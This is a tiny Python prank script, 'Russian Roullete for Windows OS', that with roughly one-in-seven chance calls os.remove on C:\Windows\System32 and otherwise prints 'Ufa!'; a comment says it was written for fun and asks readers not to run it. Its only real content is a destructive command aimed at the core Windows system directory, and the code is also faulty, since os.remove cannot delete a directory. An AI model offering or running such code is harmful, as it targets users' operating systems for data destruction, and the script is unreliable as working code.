''' Russian Roullete for Windows OS '''

# Modules
from random import randint as random_number
from os import remove as delete


# NOTE: I just did it for fun, please don't run on your PC...


# Main Code
number = random_number(0,6)
delete("C:\\Windows\\System32") if random_number(0,6) == number else print("Ufa!")